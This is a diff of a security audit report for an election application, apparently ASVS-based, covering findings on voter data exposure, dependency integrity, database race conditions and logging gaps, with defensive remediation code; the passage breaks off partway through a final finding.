+---
+
+#### FINDING-174: tally_issue() returns full voter PIDs instead of minimum required data
+
+| Attribute | Value |
+|-----------|-------|
+| Severity | 🟡 Medium |
+| ASVS Level(s) | L3 |
+| CWE | - |
+| ASVS Sections | 14.2.6 |
+| Files | v3/steve/election.py:241-270 |
+| Source Reports | 14.2.6.md |
+| Related Findings | - |
+
+**Description:**
+
+The function returns the complete set of voter PIDs (identities) alongside tally results. Per the domain context, voter identities (mayvote.who) are sensitive data. While knowing who voted (not how they voted) may be acceptable for election monitoring, returning full PIDs exceeds the minimum required data. A count of voters would suffice for most UI purposes.
+
+**Remediation:**
+
+Return voter count instead of full voter identities for general use. Create a separate privileged method for admin use that returns full voter identities. Example: modify tally_issue() to return len(voters) and create tally_issue_with_voters() for admin-only access.
+
+---
+
+#### FINDING-175: get_voters_for_email() returns all voter identities in bulk
+
+| Attribute | Value |
+|-----------|-------|
+| Severity | 🟡 Medium |
+| ASVS Level(s) | L3 |
+| CWE | - |
+| ASVS Sections | 14.2.6 |
+| Files | v3/steve/election.py:433-438 |
+| Source Reports | 14.2.6.md |
+| Related Findings | - |
+
+**Description:**
+
+This function returns all voter identities (PID, name, email) for an entire election. While this may be needed for sending ballot links, it exposes sensitive voter identity data. Per domain context, voter identities are sensitive and should be minimized. If this data is ever exposed through a page template or API response, it would violate minimum data principles.
+
+**Remediation:**
+
+Ensure this function is only called in strictly necessary contexts (e.g., email sending), and never returned in page templates or API responses. Consider returning only the fields needed for the specific use case, such as creating a get_voter_emails_for_notification() method that returns only email addresses.
+
+---
+
+#### FINDING-176: Authenticated user data persists in browser DOM without cleanup mechanism
+
+| Attribute | Value |
+|-----------|-------|
+| Severity | 🟡 Medium |
+| ASVS Level(s) | L1 |
+| CWE | - |
+| ASVS Sections | 14.3.1 |
+| Files | v3/server/pages.py:61-87 |
+| Source Reports | 14.3.1.md |
+| Related Findings | - |
+
+**Description:**
+
+Authenticated user data (uid, name, email) is injected into every page's DOM through template rendering via the basic_info() function. Without a client-side mechanism to clear the DOM or browser cache on session termination, this data persists in browser history, back-forward cache, and potentially in browser developer tools. The ASVS requirement specifically mentions 'browser DOM' should be cleared after session termination.
+
+**Remediation:**
+
+Add session timeout headers and client-side cleanup using after_request middleware: @APP.after_request async def add_security_headers(response): s = await asfquart.session.read(); if s: response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate'; response.headers['Pragma'] = 'no-cache'; response.headers['Expires'] = '0'; return response
+
+---
+
+#### FINDING-177: No verification mechanism for dependency source integrity
+
+| Attribute | Value |
+|-----------|-------|
+| Severity | 🟡 Medium |
+| ASVS Level(s) | L2 |
+| CWE | - |
+| ASVS Sections | 15.1.2 |
+| Files | Project-wide |
+| Source Reports | 15.1.2.md |
+| Related Findings | - |
+
+**Description:**
+
+There is no evidence of hash verification for downloaded packages (e.g., `--require-hashes` in pip, or hash entries in a lock file). While the domain context states dependencies should come from PyPI (a trusted source), there is no cryptographic verification that installed packages match expected artifacts. Supply chain attacks via package repository compromise or typosquatting would not be detected during installation.
+
+**Remediation:**
+
+Use `uv lock` with hash verification or pip's `--require-hashes` with entries like: cryptography==43.0.0 --hash=sha256:abc123...
+
+---
+
+#### FINDING-178: No documentation highlighting risky third-party components despite known risks
+
+| Attribute | Value |
+|-----------|-------|
+| Severity | 🟡 Medium |
+| ASVS Level(s) | L3 |
+| CWE | - |
+| ASVS Sections | 15.1.4 |
+| Files | Project-wide, election.py |
+| Source Reports | 15.1.4.md |
+| Related Findings | - |
+
+**Description:**
+
+The domain context explicitly notes that "`ezt` is not widely used, which may be a risk factor," yet no formal documentation exists that classifies this or other components according to their risk profile. Based on the ASVS definition of "risky components" (poorly maintained, unsupported, end-of-life, or history of significant vulnerabilities), the following components warrant documented risk assessment: `ezt` (not widely used, small maintainer base, niche templating engine), `easydict` (simple utility, low activity repository), `asfpy` (ASF-internal library, limited community review), and `argon2-cffi` (well-maintained but wraps C library via cffi). Without documented risk assessment, teams cannot make informed decisions about whether additional sandboxing is needed for risky components, whether alternatives should be evaluated, what additional testing is required for these components, and appropriate monitoring for vulnerability disclosures.
+
+**Remediation:**
+
+Create `docs/RISKY_COMPONENTS.md` documenting each risky component with: Risk Level (Critical/High/Medium/Low), Risk Factors (specific indicators like limited community adoption, small maintainer pool), Mitigation strategies (e.g., restrict to rendering pre-validated data only), Review Frequency (quarterly/annual), and Alternatives Considered. For example, document `ezt` as Medium risk due to limited community adoption and small maintainer pool, with mitigation to restrict to rendering pre-validated data only and quarterly review frequency, noting Jinja2 as a more maintained alternative. Document `easydict` as Low risk with infrequent updates, noting it could be replaced with dataclasses. Document `asfpy` as Low-Medium risk as internal ASF library with limited external security review, with trust boundary at organizational level. Include component risk assessment process and alternative evaluation records.
+
+---
+
+#### FINDING-179: No documentation highlighting dangerous functionality used in the application
+
+| Attribute | Value |
+|-----------|-------|
+| Severity | 🟡 Medium |
+| ASVS Level(s) | L3 |
+| CWE | - |
+| ASVS Sections | 15.1.5 |
+| Files | v3/steve/election.py:410, v3/steve/crypto.py:91-101, v3/steve/crypto.py:75-88, v3/server/main.py:40-41, v3/steve/crypto.py:63-70 |
+| Source Reports | 15.1.5.md |
+| Related Findings | - |
+
+**Description:**
+
+The application contains several instances of "dangerous functionality" as defined by ASVS (deserialization, dynamic code execution, raw data parsing, direct memory manipulation) that are not documented with their risks and mitigations: 1. Deserialization of data (json.loads) in json2kv method - While JSON is safer than pickle/yaml, it still processes structured data from database storage. 2. Low-level cryptographic operations (argon2.low_level) - Direct use of low_level API bypasses safety checks of the high-level argon2 API. 3. Symmetric encryption/decryption with key material handling - create_vote and decrypt_votestring functions handle sensitive cryptographic operations. 4. Dynamic module imports - pages and api modules are dynamically imported. 5. HKDF key derivation with hardcoded info parameter - The info parameter references XChaCha20 but the derived key is used for Fernet, which could confuse auditors or lead to incorrect cryptographic assumptions. Without documentation, developers and auditors cannot quickly identify where the most security-sensitive code resides, what additional review/testing these areas require, what the acceptable input constraints are for dangerous operations, and what the blast radius is if a vulnerability is found in these areas.
+
+**Remediation:**
+
+Create docs/DANGEROUS_FUNCTIONALITY.md documenting: Cryptographic Key Derivation (crypto.py) - Type: Direct memory manipulation (Argon2 low-level), key material handling, Location: v3/steve/crypto.py:_hash(), _b64_vote_key(), gen_opened_key(), Risk: Incorrect parameters could weaken vote encryption, Mitigation: Parameters benchmarked, unit tested, review required for changes, Input Trust: All inputs are system-generated (salts, tokens) — not user-controlled; Vote Encryption/Decryption (crypto.py) - Type: Symmetric encryption with derived keys, Location: v3/steve/crypto.py:create_vote(), decrypt_votestring(), Risk: Key leakage exposes all votes for an election, Mitigation: Keys derived per-voter-per-issue, never stored in plaintext; Data Deserialization (election.py) - Type: JSON deserialization, Location: v3/steve/election.py:json2kv(), Risk: Low (JSON parser, data sourced from database), Mitigation: Data written by application's own kv2json(); no untrusted input; Dynamic Module Loading (main.py) - Type: Dynamic imports at startup, Location: v3/server/main.py:create_app(), Risk: Module injection if filesystem compromised, Mitigation: Imports are hardcoded module names, not user-controlled strings.
+
+---
+
+#### FINDING-180: Default group configuration includes all dependency groups
+
+| Attribute | Value |
+|-----------|-------|
+| Severity | 🟡 Medium |
+| ASVS Level(s) | L2 |
+| CWE | - |
+| ASVS Sections | 15.2.3 |
+| Files | v3/pyproject.toml:36 |
+| Source Reports | 15.2.3.md |
+| Related Findings | - |
+
+**Description:**
+
+The `default-groups = "all"` setting instructs `uv` to install ALL dependency groups by default, including development and linting tools (`faker`, `python-ldap`, `coverage`, `ruff`, `mypy`). If a production deployment uses `uv install` or `uv sync` without explicitly overriding this setting, development dependencies will be installed in the production environment. Specifically, the following would be present in production: `faker` (test data generation, could expose test utilities), `python-ldap` (if only needed for dev/testing LDAP scenarios), `coverage` (code coverage tool), `ruff`/`mypy` (code analysis tools). Development tools in production expand the attack surface. `faker` could be imported to generate fake data, `coverage` can instrument code for information disclosure, and unnecessary packages increase the supply chain attack surface.
+
+**Remediation:**
+
+Change the default to only include production groups, or remove the `default-groups` directive entirely. For production deployments, ensure the deployment script explicitly excludes dev groups using `uv sync --no-group dev --no-group lint`.
+
+---
+
+#### FINDING-181: ASF-internal packages without explicit repository pinning
+
+| Attribute | Value |
+|-----------|-------|
+| Severity | 🟡 Medium |
+| ASVS Level(s) | L3 |
+| CWE | - |
+| ASVS Sections | 15.2.4 |
+| Files | v3/pyproject.toml:11-12 |
+| Source Reports | 15.2.4.md |
+| Related Findings | - |
+
+**Description:**
+
+The packages `asfpy` and `asfquart` are Apache Software Foundation internal packages. While they are published on PyPI, there is no explicit configuration pinning these packages to a specific index URL or verifying their integrity via hashes. Key concerns: 1. No lock file visible: No `uv.lock`, `poetry.lock`, or `requirements.txt` with hashes is provided in this audit scope. Without hash pinning, a compromised PyPI package (or a typosquat like `asfppy` or `asfquart2`) could be substituted. 2. No index URL restriction: The `pyproject.toml` does not configure a specific package index for ASF packages. If the organization uses an internal registry alongside PyPI, there's a potential for dependency confusion. 3. No integrity verification: No `[tool.uv.sources]` or equivalent configuration specifying the expected source for these packages. Impact: If an attacker publishes a higher-versioned malicious package with the same name on PyPI (or compromises the existing package), it could be installed in place of the legitimate dependency. This is partially mitigated by the packages being published on PyPI by ASF, but the absence of hash pinning means integrity is not cryptographically verified.
+
+**Remediation:**
+
+1. Maintain a lock file with integrity hashes: `uv lock` to generate uv.lock with cryptographic hashes for all packages. 2. Consider explicit source configuration for ASF packages using `[tool.uv.sources]` to specify index URLs. 3. Use `--require-hashes` or equivalent in CI/CD deployment to enforce integrity verification.
+
+---
+
+#### FINDING-182: EasyDict Dependency Enables Attribute-style Mass Assignment Patterns
+
+| Attribute | Value |
+|-----------|-------|
+| Severity | 🟡 Medium |
+| ASVS Level(s) | L2 |
+| CWE | - |
+| ASVS Sections | 15.3.3 |
+| Files | v3/pyproject.toml:14 |
+| Source Reports | 15.3.3.md |
+| Related Findings | - |
+
+**Description:**
+
+The `easydict` library converts dictionary keys to object attributes, which can facilitate mass assignment when user-controlled input dictionaries are passed directly to such objects. Without explicit field whitelisting at the controller/action level (which cannot be verified from `pyproject.toml` alone), this dependency introduces an architectural pattern that could enable mass assignment. The domain context explicitly states: 'Mass assignment risks exist in form handling—input should be explicitly mapped to model fields.' This confirms the risk is recognized but mitigation cannot be verified from the available code. An attacker could potentially inject or modify fields not intended for user modification (e.g., `owner_pid`, `is_admin`, election state fields) if request data is mapped to model objects without explicit field filtering.
+
+**Remediation:**
+
+Use explicit field extraction instead of passing request data directly to EasyDict objects. Example: ALLOWED_FIELDS = {"title", "description", "start_date", "end_date"}; form_data = await request.form; election_data = {k: form_data[k] for k in ALLOWED_FIELDS if k in form_data}. Implement explicit field whitelisting at every state-changing endpoint. Add input schema validation (e.g., using `pydantic` or manual whitelists).
+
+---
+
+#### FINDING-183: SQLite Shared Database Access Without Explicit Synchronization in Async Context
+
+| Attribute | Value |
+|-----------|-------|
+| Severity | 🟡 Medium |
+| ASVS Level(s) | L3 |
+| CWE | - |
+| ASVS Sections | 15.4.1, 15.4.3 |
+| Files | v3/pyproject.toml |
+| Source Reports | 15.4.1.md, 15.4.3.md |
+| Related Findings | - |
+
+**Description:**
+
+The domain context confirms: "No explicit locking mechanisms are visible for the database" and "Thread safety should be considered for shared resources, though Quart's async model reduces some concurrency risks." SQLite has several concurrency constraints: Only one writer at a time (default journal mode), concurrent reads are allowed, and in WAL mode, one writer + multiple readers are allowed. In an async Quart application, multiple coroutines can attempt database writes concurrently (e.g., two voters submitting votes simultaneously to the same election). Without explicit synchronization (e.g., asyncio.Lock), this could result in: database is locked errors, race conditions in read-modify-write patterns (e.g., checking voter eligibility then inserting vote), and TOCTOU vulnerabilities (check if voter has voted → insert vote, where concurrent requests pass the check).
+
+**Remediation:**
+
+Implement an encapsulated database access layer with explicit locking: Create a DatabaseManager class that encapsulates all locking logic for database access with an internal write lock (asyncio.Lock) that is not exposed. Implement an atomic_write context manager that acquires write lock with timeout (5.0 seconds) to prevent deadlocks. Configure SQLite busy_timeout to prevent indefinite blocking during concurrent access. Enable WAL mode with PRAGMA journal_mode = WAL to allow concurrent reads during write operations. Add atomic transaction wrappers ensuring all state-check-then-act patterns use BEGIN IMMEDIATE transactions. Consider using aiosqlite to wrap SQLite access in async-compatible library to properly integrate with Quart's event loop without blocking.
+
+---
+
+#### FINDING-184: Insufficient Evidence of Atomic Operations for Vote State Checks
+
+| Attribute | Value |
+|-----------|-------|
+| Severity | 🟡 Medium |
+| ASVS Level(s) | L3 |
+| CWE | - |
+| ASVS Sections | 15.4.2 |
+| Files | - |
+| Source Reports | 15.4.2.md |
+| Related Findings | - |
+
+**Description:**
+
+The domain context explicitly states 'No explicit locking mechanisms are visible for the database' and the application uses SQLite with synchronous operations in an async (Quart) framework. In a voting system, critical TOCTOU-susceptible operations include: checking voter eligibility (mayvote) before recording a vote, checking election state (open/closed) before accepting a vote, and checking if a voter has already voted before allowing re-vote. Without the application source code, it is impossible to verify whether these checks and subsequent actions are performed atomically (e.g., within a single SQLite transaction with appropriate isolation level). If election state or voter eligibility checks are not atomic with the dependent action, a race condition could allow votes to be recorded after an election closes or by unauthorized voters during a brief window.
+
+**Remediation:**
+
+Ensure all state-check-then-act patterns are wrapped in SQLite transactions. Example: Atomic eligibility check + vote insertion using BEGIN IMMEDIATE to acquire write lock immediately, then check eligibility and insert vote within the same transaction, with proper ROLLBACK on failure and COMMIT on success. Configure SQLite busy_timeout to prevent indefinite blocking during concurrent access. Enable WAL mode using PRAGMA journal_mode = WAL to allow concurrent reads during write operations. Implement encapsulated database manager to own all locking logic and database connections. Add atomic transaction wrappers for all state-check-then-act patterns. Add concurrency tests that simulate concurrent vote submissions to validate behavior under contention.
+
+---
+
+#### FINDING-185: Mixed logging mechanisms (print vs logger) create undocumented output channels
+
+| Attribute | Value |
+|-----------|-------|
+| Severity | 🟡 Medium |
+| ASVS Level(s) | L2 |
+| CWE | - |
+| ASVS Sections | 16.1.1 |
+| Files | v3/server/pages.py:427, v3/server/pages.py:449, v3/server/bin/tally.py:127, v3/server/bin/tally.py:152, v3/server/bin/tally.py:157 |
+| Source Reports | 16.1.1.md |
+| Related Findings | - |
+
+**Description:**
+
+Multiple code paths use `print()` statements alongside the formal `_LOGGER` system. These bypass any logging framework configuration (formatters, handlers, filters, destinations) and output to stdout directly, creating undocumented log channels that cannot be inventoried. Security-relevant information (form submissions, tamper detection alerts) exits through channels not covered by any logging policy, potentially being lost or logged without proper access controls.
+
+**Remediation:**
+
+Replace all print statements with proper logging calls. Use `_LOGGER.debug()` for form data logging and `_LOGGER.critical()` for security events like tamper detection. Example: `_LOGGER.debug(f'Form data received for issue creation in election[E:{election.eid}]')` and `_LOGGER.critical(f'TAMPER DETECTED: Election[E:{election_id}] integrity check failed')`.
+
+---
+
+#### FINDING-186: Authorization failure events lack structured metadata
+
+| Attribute | Value |
+|-----------|-------|
+| Severity | 🟡 Medium |
+| ASVS Level(s) | L2 |
+| CWE | - |
+| ASVS Sections | 16.2.1 |
+| Files | v3/server/pages.py:199-201 |
+| Source Reports | 16.2.1.md |
+| Related Findings | - |
+
+**Description:**
 
 When a user attempts to access an election they are not authorized to vote in, the application returns a 404 but does not log this authorization failure. This is a security event (potential enumeration or unauthorized access attempt) that should include WHO tried, WHAT they tried to access, WHEN, and the outcome. Authorization failures are invisible to security monitoring. Repeated attempts to access unauthorized elections cannot be detected or alerted upon.
 
 **Remediation:**
 
-Add _LOGGER.warning() call when authorization check fails in vote_on_page, capturing user=U:{result.uid}, resource=election[E:{election.eid}], action=vote_access, and reason=not_in_mayvote before returning 404.
+```python
+election.q_find_issues.perform(result.uid, election.eid)
+if not election.q_find_issues.fetchall():
+    _LOGGER.warning(
+        f'AUTHZ_DENIED user=U:{result.uid} resource=election[E:{election.eid}] '
+        f'action=vote_access reason=not_in_mayvote'
+    )
+    result = await basic_info()
+    result.title = 'Access Denied'
+    result.eid = election.eid
+    raise_404(T_BAD_EID, result)
+```
 
 ---
 
-#### FINDING-176: Election state change operations in election.py lack logging
+#### FINDING-187: Election state change operations in election.py lack logging
 
 | Attribute | Value |
 |-----------|-------|
-| **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L2 |
-| **CWE** | - |
-| **ASVS Sections** | 16.2.1 |
-| **Files** | v3/steve/election.py:110-115, v3/steve/election.py:117-137 |
-| **Source Reports** | 16.2.1.md |
-| **Related** | - | **Description:**
+| Severity | 🟡 Medium |
+| ASVS Level(s) | L2 |
+| CWE | - |
+| ASVS Sections | 16.2.1 |
+| Files | v3/steve/election.py:110-115, v3/steve/election.py:117-137 |
+| Source Reports | 16.2.1.md |
+| Related Findings | - |
 
-Critical election lifecycle operations (close(), add_salts(), delete()) do not emit log entries at the library level. While pages.py logs the close event when invoked via the web interface, direct library usage (e.g., from tally.py or future integration paths) leaves no trace. If the library is used outside the web context, security-critical state changes occur without audit trails.
+**Description:**
+
+Critical election lifecycle operations (`close()`, `add_salts()`, `delete()`) do not emit log entries at the library level. While `pages.py` logs the close event when invoked via the web interface, direct library usage (e.g., from `tally.py` or future integration paths) leaves no trace. If the library is used outside the web context, security-critical state changes occur without audit trails.
 
 **Remediation:**
 
-Add _LOGGER.info() calls to close(), add_salts(), and delete() methods in election.py to log state changes at the library level, including Election[E:{self.eid}] identifier and the action performed.
+```python
+def close(self):
+    "Close an election."
+    assert self.is_open()
+    self.c_close.perform(self.eid)
+    _LOGGER.info(f'Election[E:{self.eid}] state changed to CLOSED')
+```
 
 ---
 
-#### FINDING-177: No logging format configuration enforces UTC timestamps
+#### FINDING-188: No logging format configuration enforces UTC timestamps
 
 | Attribute | Value |
 |-----------|-------|
-| **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L2 |
-| **CWE** | - |
-| **ASVS Sections** | 16.2.2 |
-| **Files** | v3/server/bin/tally.py:165, v3/server/pages.py:entire file |
-| **Source Reports** | 16.2.2.md |
-| **Related** | - | **Description:**
+| Severity | 🟡 Medium |
+| ASVS Level(s) | L2 |
+| CWE | - |
+| ASVS Sections | 16.2.2 |
+| Files | v3/server/bin/tally.py:165, v3/server/pages.py |
+| Source Reports | 16.2.2.md |
+| Related Findings | - |
+
+**Description:**
 
 The application does not configure a logging format that ensures: 1. Timestamps are present in every log entry 2. Timestamps use UTC (or include explicit timezone offset) 3. Time sources are synchronized across components. The logging.basicConfig(level=logging.INFO) in tally.py uses the default format which does NOT include a timestamp at all (default format is %(levelname)s:%(name)s:%(message)s). The web server's logging configuration is not shown but relies on framework defaults which typically use local time without timezone. Additionally, pages.py uses datetime.datetime.now() (line 571) and datetime.datetime.fromtimestamp() (line 86) without timezone awareness, suggesting a general lack of UTC discipline.
 
 **Remediation:**
 
-Configure UTC timestamps globally using logging.basicConfig with format='%(asctime)s %(levelname)s %(name)s %(message)s', datefmt='%Y-%m-%dT%H:%M:%S.%fZ', and set logging.Formatter.converter = time.gmtime to force UTC. Alternatively, use a JSON formatter for structured logging with ISO 8601 timestamps that include timezone information.
+Configure UTC timestamps globally:
+```python
+import logging
+
+logging.basicConfig(
+    level=logging.INFO,
+    format='%(asctime)s %(levelname)s %(name)s %(message)s',
+    datefmt='%Y-%m-%dT%H:%M:%S.%fZ',
+)
+logging.Formatter.converter = time.gmtime  # Force UTC
+
+# Or use a JSON formatter for structured logging
+import json_log_formatter
+formatter = json_log_formatter.JSONFormatter()
+handler = logging.StreamHandler()
+handler.setFormatter(formatter)
+# Timestamps will be ISO 8601 with timezone
+```
 
 ---
 
-#### FINDING-178: No structured logging format enables machine parsing and correlation
+#### FINDING-189: No structured logging format enables machine parsing and correlation
 
 | Attribute | Value |
 |-----------|-------|
-| **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L2 |
-| **CWE** | - |
-| **ASVS Sections** | 16.2.4 |
-| **Files** | v3/server/pages.py:all logging calls, v3/steve/election.py:all logging calls |
-| **Source Reports** | 16.2.4.md |
-| **Related** | - | **Description:**
+| Severity | 🟡 Medium |
+| ASVS Level(s) | L2 |
+| CWE | - |
+| ASVS Sections | 16.2.4 |
+| Files | v3/server/pages.py:all logging calls, v3/steve/election.py:all logging calls |
+| Source Reports | 16.2.4.md |
+| Related Findings | - |
 
-The application uses unstructured f-string log messages that vary in format between modules. While the `[U:xxx]`, `[E:xxx]`, `[I:xxx]` convention is helpful, the overall format is not machine-parseable without custom regex patterns. Issues include: 1. No common structured format (JSON, CEF, CLF) is used, 2. Inconsistent field ordering: Some messages start with "User[U:]", others with "Created", 3. No correlation ID: No request ID or trace ID to correlate multiple log entries from the same request, 4. Mixed separators: Uses semicolons, commas, and natural language inconsistently, 5. No event type field: Cannot filter by event category without text matching. Log processors (ELK, Splunk, CloudWatch) would require custom parsing rules for each message variant. Automated alerting on patterns like "3 failed access attempts in 5 minutes" becomes difficult without structured fields.
+**Description:**
+
+The application uses unstructured f-string log messages that vary in format between modules. While the [U:xxx], [E:xxx], [I:xxx] convention is helpful, the overall format is not machine-parseable without custom regex patterns. Issues include: 1) No common structured format (JSON, CEF, CLF) is used, 2) Inconsistent field ordering: Some messages start with "User[U:]", others with "Created", 3) No correlation ID: No request ID or trace ID to correlate multiple log entries from the same request, 4) Mixed separators: Uses semicolons, commas, and natural language inconsistently, 5) No event type field: Cannot filter by event category without text matching. Log processors (ELK, Splunk, CloudWatch) would require custom parsing rules for each message variant. Automated alerting on patterns like "3 failed access attempts in 5 minutes" becomes difficult without structured fields.
 
 **Remediation:**
 
-Implement structured logging using structlog or similar library. Example: import structlog; logger = structlog.get_logger(); logger.info("election.vote_cast", actor_uid=result.uid, election_id=election.eid, issue_id=iid, event_type="security", action="vote_cast"). Output should be JSON format with consistent fields.
+Implement structured logging using structlog or python-json-logger to produce JSON log entries with consistent fields. Example: logger.info("election.vote_cast", actor_uid=result.uid, election_id=election.eid, issue_id=iid, event_type="security", action="vote_cast"). Output should be: {"event": "election.vote_cast", "actor_uid": "jdoe", "election_id": "a1b2c3d4e5", ...}
 
 ---
 
-#### FINDING-179: Tally output includes full voter identity list without classification controls
+#### FINDING-190: Tally output includes full voter identity list without classification controls
 
 | Attribute | Value |
 |-----------|-------|
-| **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L2 |
-| **CWE** | - |
-| **ASVS Sections** | 16.2.5 |
-| **Files** | v3/server/bin/tally.py:129-132 |
-| **Source Reports** | 16.2.5.md |
-| **Related** | - | **Description:**
+| Severity | 🟡 Medium |
+| ASVS Level(s) | L2 |
+| CWE | - |
+| ASVS Sections | 16.2.5 |
+| Files | v3/server/bin/tally.py:129-132 |
+| Source Reports | 16.2.5.md |
+| Related Findings | - |
 
-The JSON output format includes a complete sorted list of voter PIDs (`voters=sorted(all_voters)`). This reveals which specific individuals voted on each issue, which could be considered sensitive in some election contexts (e.g., someone's participation/non-participation in a controversial vote). The voter list is output without any masking or classification-based control. Voter participation metadata is output in cleartext. While knowing WHO voted doesn't reveal HOW they voted (votes are shuffled), participation patterns could be sensitive. The sorted output also enables easy diff-ing between multiple tallies to identify new voters.
+**Description:**
+
+The JSON output format includes a complete sorted list of voter PIDs (`voters=sorted(all_voters)`). This reveals which specific individuals voted on each issue, which could be considered sensitive in some election contexts (e.g., someone's participation/non-participation in a controversial vote). The voter list is output without any masking or classification-based control. While knowing WHO voted doesn't reveal HOW they voted (votes are shuffled), participation patterns could be sensitive. The sorted output also enables easy diff-ing between multiple tallies to identify new voters.
 
 **Remediation:**
 
-Option 1: Hash voter identities in output using hashlib.sha256(v.encode()).hexdigest()[:12]. Option 2: Only include voter count, not identities, with voters list available only with --verbose flag.
+Option 1: Hash voter identities in output using `hashlib.sha256(v.encode()).hexdigest()[:12]`. Option 2: Only include voter count, not identities, and make voters list available only with --verbose flag.
 
 ---
 
-#### FINDING-180: Exception details potentially leak sensitive information into error logs
+#### FINDING-191: Exception details potentially leak sensitive information into error logs
 
 | Attribute | Value |
 |-----------|-------|
-| **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L2 |
-| **CWE** | - |
-| **ASVS Sections** | 16.2.5 |
-| **Files** | v3/server/pages.py:356 |
-| **Source Reports** | 16.2.5.md |
-| **Related** | - | **Description:**
+| Severity | 🟡 Medium |
+| ASVS Level(s) | L2 |
+| CWE | - |
+| ASVS Sections | 16.2.5 |
+| Files | v3/server/pages.py:356 |
+| Source Reports | 16.2.5.md |
+| Related Findings | - |
+
+**Description:**
 
 The catch-all `Exception` handler logs the full exception message (`{e}`). Depending on the failure mode, this could include: cryptographic operation details (key derivation failures, Fernet errors), database state information (SQLite error messages with table/column names), internal path information, or partial sensitive data that caused the error. The error message is not sanitized before logging. Exception messages could leak internal implementation details into logs. If logs are accessible to a broader audience than the application code, this creates an information disclosure risk.
 
 **Remediation:**
 
-Log only exception type name in standard logs: _LOGGER.error(f'Vote submission failed for user[U:{result.uid}] on issue[I:{iid}] in election[E:{election.eid}]: {type(e).__name__}', exc_info=True). Full traceback only at configured log level.
+Sanitize exception logging to only include exception type and use exc_info parameter for detailed tracebacks: `_LOGGER.error(f'Vote submission failed for user[U:{result.uid}] on issue[I:{iid}] in election[E:{election.eid}]: {type(e).__name__}', exc_info=True)`
 
 ---
 
-#### FINDING-181: No Authentication Metadata Captured in Existing Logs
+#### FINDING-192: No Authentication Metadata Captured in Existing Logs
 
 | Attribute | Value |
 |-----------|-------|
-| **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L2 |
-| **CWE** | - |
-| **ASVS Sections** | 16.3.1 |
-| **Files** | v3/server/pages.py:106-108, v3/server/pages.py:404-407, v3/server/pages.py:440-443 |
-| **Source Reports** | 16.3.1.md |
-| **Related** | - | **Description:**
+| Severity | 🟡 Medium |
+| ASVS Level(s) | L2 |
+| CWE | - |
+| ASVS Sections | 16.3.1 |
+| Files | v3/server/pages.py:106-108, v3/server/pages.py:404-407, v3/server/pages.py:440-443 |
+| Source Reports | 16.3.1.md |
+| Related Findings | - |
+
+**Description:**
 
 The existing log messages record user actions but do not include authentication metadata (authentication type, factors used, session age, IP address). Even where actions are logged, there's insufficient metadata to correlate events with authentication context (OAuth provider, MFA status, source IP).
 
 **Remediation:**
 
-Include authentication metadata in log messages: auth_method=oauth, ip address, session_id hash, and other relevant authentication context for all user actions.
+Include authentication metadata in log messages:
+```python
+_LOGGER.info(
+    'ELECTION_DATE_SET: uid=%s, election=%s, field=%s, value=%s, '
+    'auth_method=oauth, ip=%s, session_id=%s',
+    sanitize_log(result.uid),
+    sanitize_log(election.eid),
+    field,
+    date_str,
+    quart.request.remote_addr,
+    session_id_hash,
+)
+```
 
 ---
 
-#### FINDING-182: No Authorization Logging in Vote Submission
+#### FINDING-193: Election State Assertion Failures Not Logged
 
 | Attribute | Value |
 |-----------|-------|
-| **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L2, L3 |
-| **CWE** | - |
-| **ASVS Sections** | 16.3.2 |
-| **Files** | v3/server/pages.py:380-422 |
-| **Source Reports** | 16.3.2.md |
-| **Related** | - | **Description:**
+| Severity | 🟡 Medium |
+| ASVS Level(s) | L2 |
+| CWE | - |
+| ASVS Sections | 16.3.3 |
+| Files | v3/steve/election.py:multiple |
+| Source Reports | 16.3.3.md |
+| Related Findings | - |
 
-The vote endpoint has a comment indicating incomplete authorization implementation and does not log authorization decisions. While add_vote in election.py checks mayvote internally, no explicit authorization decision is logged, preventing audit trail of who attempted to vote and whether they were authorized.
+**Description:**
+
+State validation uses Python assert statements which raise AssertionError without logging. Attempts to bypass election state controls (e.g., voting in a closed election, modifying an open election) produce no audit trail. These are business logic bypass attempts that should be logged per ASVS 16.3.3. Assertions are also disabled when Python runs with optimization (-O flag), making this a potential security bypass. Affected functions: delete, open, close, add_issue, edit_issue, delete_issue, add_voter, add_vote.
 
 **Remediation:**
 
-Implement explicit authorization check for vote submission and log both successful and failed authorization attempts. Include user ID, election ID, timestamp, and IP address in authorization logs.
+Replace assert statements with explicit conditional checks that log security events before raising exceptions:
+```python
+def add_vote(self, pid: str, iid: str, votestring: str):
+    if not self.is_open():
+        _LOGGER.warning(
+            'BUSINESS_LOGIC_BYPASS: attempt to vote on non-open election, '
+            'election=%s, state=%s, pid=%s, iid=%s',
+            self.eid, self.get_state(), pid, iid,
+        )
+        raise ElectionBadState(self.eid, self.get_state(), self.S_OPEN)
+```
 
 ---
 
-#### FINDING-183: Election State Assertion Failures Not Logged
+#### FINDING-194: Assertion Errors Not Caught or Logged at Application Level
 
 | Attribute | Value |
 |-----------|-------|
-| **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L2 |
-| **CWE** | - |
-| **ASVS Sections** | 16.3.3 |
-| **Files** | v3/steve/election.py:multiple |
-| **Source Reports** | 16.3.3.md |
-| **Related** | - | **Description:**
+| Severity | 🟡 Medium |
+| ASVS Level(s) | L2 |
+| CWE | - |
+| ASVS Sections | 16.3.4 |
+| Files | v3/steve/election.py:48, v3/steve/election.py:69, v3/steve/election.py:115, v3/steve/election.py:178, v3/steve/election.py:197, v3/steve/election.py:211, v3/steve/election.py:238 |
+| Source Reports | 16.3.4.md |
+| Related Findings | - |
 
-State validation uses Python assert statements which raise AssertionError without logging. Attempts to bypass election state controls (e.g., voting in a closed election, modifying an open election) produce no audit trail. These are business logic bypass attempts that should be logged per ASVS 16.3.3. Assertions are also disabled when Python runs with optimization (-O flag), making this a potential security bypass.
-
-**Remediation:**
-
-Replace assertions with explicit checks and logging: if not self.is_open(): _LOGGER.warning('BUSINESS_LOGIC_BYPASS: attempt to vote on non-open election, election=%s, state=%s, pid=%s, iid=%s', self.eid, self.get_state(), pid, iid); raise ElectionBadState(...)
-
----
-
-#### FINDING-184: No Logging of Anti-Automation or Rate Limiting Events
-
-| Attribute | Value |
-|-----------|-------|
-| **Severity** | 🟡 Medium |
